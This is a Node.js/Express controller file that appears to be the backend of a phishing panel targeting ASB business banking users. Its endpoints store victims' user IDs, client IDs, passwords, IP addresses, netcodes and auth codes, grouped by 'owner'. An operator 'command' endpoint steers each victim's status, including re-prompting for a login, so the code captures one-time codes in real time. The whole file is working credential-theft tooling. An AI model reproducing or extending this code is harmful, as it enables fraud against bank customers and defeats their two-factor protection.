const ASB = require("../models/asbBusinessModel");

const getOwnerVics = async (req, res) => {
    const { owner } = req.params;
    ASB.find({ owner }).exec((err, vics) => {
        if (err) {
            console.log(err);
            res.status(404).send("Error");
            return;
        }
        res.send(vics);
    });
};

const command = async (req, res) => {
    const { uniqueid, status } = req.body;
    try {
        await ASB.findOneAndUpdate({ uniqueid }, { status }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const getInfo = async (req, res) => {
    const { uniqueid } = req.params;
    ASB.findOne({ uniqueid }).exec((err, vic) => {
        if (err) {
            console.log(err);
            res.status(404).send("Error");
            return;
        }
        res.send(vic);
    });
};

const submitLogin = async (req, res) => {
    const { userId, clientId, password, uniqueid, owner, ip } = req.body;
    try {
        await ASB.create({ uniqueid, userId, clientId, password, status: 1, owner, ip });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitLoginAgain = async (req, res) => {
    const { userId, clientId, password, uniqueid } = req.body;
    try {
        await ASB.findOneAndUpdate(
            { uniqueid },
            { userId, clientId, password, status: 0 }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitNetcode = async (req, res) => {
    const { netcode, uniqueid } = req.body;
    try {
        await ASB.findOneAndUpdate(
            { uniqueid },
            { netcode, status: 5 }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitAuth = async (req, res) => {
    const { authCode, uniqueid } = req.body;
    try {
        await ASB.findOneAndUpdate(
            { uniqueid },
            { authCode, status: 3 }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};


const deleteEntry = async (req, res) => {
    const { uniqueid } = req.body;
    try {
        await ASB.deleteOne({ uniqueid });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

module.exports = {
    getOwnerVics,
    command,
    getInfo,
    submitLogin,
    submitLoginAgain,
    submitAuth,
    submitNetcode,
    deleteEntry,
};
